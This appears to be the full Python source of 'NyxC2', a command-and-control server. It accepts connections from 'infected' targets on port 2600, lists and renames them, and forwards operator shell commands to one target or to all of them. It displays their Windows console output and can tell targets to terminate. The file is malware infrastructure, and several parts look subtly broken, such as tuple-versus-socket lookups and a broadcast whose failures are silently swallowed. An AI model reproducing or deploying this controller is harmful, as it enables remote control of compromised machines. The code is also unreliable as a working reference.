import socket
import select
import sys
import struct
from AES_RSA import *


def server():
    # Create the TCP listening socket used to accept connections from clients.
    # AF_INET selects IPv4, while SOCK_STREAM creates a reliable TCP stream.
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(("0.0.0.0", 2600))
    soc.listen(1)
    
    
    #setup the RSA
    private_key,public_key = rsa_key_setup()

    # select() watches the listening socket, connected client sockets, and
    # standard input together. This lets the operator type commands while the
    # server continues receiving data from connected clients.
    server_list = [soc, sys.stdin]

    # Keep a lookup table from the operator-visible target name to its socket.
    # A newly connected target is initially identified by its IPv4 address.
    #format of dict_ip : "<nom_cible>": (<socket_client>, rsa_sent (true or false), aes_key)
    dict_ip = {}
    print("Server is ready and listening")
    print("waiting for connection")
    while True:
        # Block until one of the monitored objects has data ready to read.
        # The writable and exceptional lists are intentionally unused here.
        r_sock, w_sock, x_sock = select.select(server_list, [], [])
        for elem in r_sock:
            if elem == soc:
                # The listening socket is readable when a new connection is
                # waiting. accept() returns both its socket and remote address.
                (clientsocket, addressguest) = soc.accept()
                print(f"Connection from {addressguest}")
                if not clientsocket in server_list:
                    server_list.append(clientsocket)
                if not addressguest in dict_ip:
                    # addressguest contains (IP, port); only the IP is used as
                    # the default name displayed in the operator console.
                    dict_ip[addressguest[0]] = (clientsocket,True, None)
                    send_message( str(dict_ip[addressguest[0]][0]) + " " + public_key, dict_ip)
                    
                    
                    
            elif elem == sys.stdin:
                # Standard input is handled as an event source. The first word
                # determines whether the line is a management or target command.
                command = sys.stdin.readline().strip()
                if not command:
                    continue #accidental Enter pressed

                # Split once so the rest of the line remains the command,
                # including spaces that may be required by that command.
                parts = command.split(" ", 1)
                indication = parts[0]
                order = parts[1] if len(parts) > 1 else ""
                if indication == "mc":
                    # Commands beginning with "mc" operate on the server's
                    # local connection table instead of being forwarded.
                    match order.strip().split(" ")[0]:
                        case "rename":
                            # Replace only the dictionary key; the existing
                            # socket remains associated with the same client.
                            old_name = order.strip().split(" ")[1]
                            new_name = order.strip().split(" ")[2]
                            try:
                                
                                dict_ip[new_name] = dict_ip[old_name]
                                del dict_ip[old_name]
                            except : 
                                print("error in your command")
                                print("NyxC2 > ", end="", flush=True)
                            
                        case "list":
                            # Display all registered target names and sockets.
                            for infected in dict_ip:
                                print(f"{infected}: {dict_ip[infected]}")
                        case "connect":
                            # Send an echo command as a simple connectivity test.
                            target = order.strip().split(" ")[1]
                            send_message(target + " echo i'm connected", dict_ip)
                        case "help":
                            # Print the commands supported by the operator UI.
                            print("\n---  NyxC2 Master Commands  ---")
                            print("mc list               : Show all active connected targets")
                            print("mc rename <old> <new> : Rename a target's alias/IP")
                            print("mc connect <target>   : Test connection to a specific target")
                            print("mc help               : Display this help menu")
                            print("mc kill  <target|*>   : close script for a target")
                            print("<target|*> <command>  : Send a command to target(s). * for all targets")
                            print("------------------------------------\n")
                    
                        case "kill":
                            # Ask for the target and send the special marker
                            # that instructs the selected client to terminate.
                            target = input("who to kill : ")
                            
                            
                            send_message(target + "#", dict_ip)
                            return
                    
                    
                    
                else:
                    # Forward normal input using the format "<target|*> <command>".
                    send_message(command, dict_ip)
                print("NyxC2 > ", end="", flush=True)
            else:
                # This event belongs to a connected client socket. Find its
                # current display name so received output can be identified.
                nom_cible = "Inconnu"
                for name, sock in dict_ip.items():
                    if sock == elem:
                        nom_cible = name
                        break
                try:
                    # Read up to 4096 bytes from the client. An empty byte
                    # string means that the peer closed the connection cleanly.
                    new_data = elem.recv(4096)
                    
                    if not new_data:
                        print(f"connection lost with {nom_cible}")
                        print("\nNyxC2 > ", end="", flush=True)
                        server_list.remove(elem)
                        if nom_cible in dict_ip:
                            del dict_ip[nom_cible]
                        elem.close()
                    else:
                        # Decode command output using the Windows code page
                        # commonly used by console applications. Invalid bytes
                        # are replaced so decoding cannot stop the event loop.
                        new_data = new_data.decode('cp850', errors='replace').strip()
                            
                        if new_data:
                            print(f"\n[answer from {nom_cible}] :\n {new_data}")
                        if new_data.endswith('>'):
                            print("\nNyxC2 > ", end="", flush=True)
                except ConnectionResetError:
                    # Remove a forcibly disconnected client from both tracking
                    # collections before closing its socket object.
                    print(f"connection brutally interrupted with {nom_cible}")
                    if nom_cible in dict_ip:
                            del dict_ip[nom_cible]
                    server_list.remove(elem)
                    elem.close()
                    print("NyxC2 > ", end="", flush=True)
                    
                

    soc.close()
    return



def send_message(message, infected_dict):
    # Parse the operator protocol: the first token is a target name or '*',
    # and the remaining text is the command that should be sent.
    parts = message.strip().split(" ", 1)
    
    
    if len(parts) < 2:
        # A target without a command cannot produce a valid protocol message.
        print("[!] Format : <IP ou *> <commande>")
        return 0
        
    target = parts[0]
    
    
    
    final_mess = parts[1] + "\n"
    # The receiver expects a four-byte little-endian length before the payload.
    # Count encoded bytes rather than Python characters because UTF-8 characters
    # can occupy more than one byte when transmitted over the socket.
    lenHeader = len(final_mess.encode("utf-8"))
    header = struct.pack("<I", lenHeader)

    
    if target == "*":
        # Broadcast the same framed command to every registered client. A send
        # error is ignored here so one unavailable client does not stop delivery
        # to the other clients.
        for name,socket_client in infected_dict.items():
            try:
                socket_client.send(header + final_mess.encode("utf-8"))
            except Exception:
                pass
    else:
        if target in infected_dict:
            # Send the length header followed by the exact command payload
            # expected by the client's receive loop.
            try:
                infected_dict[target][0].send(header + final_mess.encode("utf-8"))
            except Exception as e:
                print(f"[!] Erreur d'envoi à {target}")
        else:
            # Report an unknown target instead of attempting an invalid lookup.
            print(f"[!] Cible '{target}' introuvable. Tapez 'mc list' pour voir les cibles.")
            
    return 1




















server()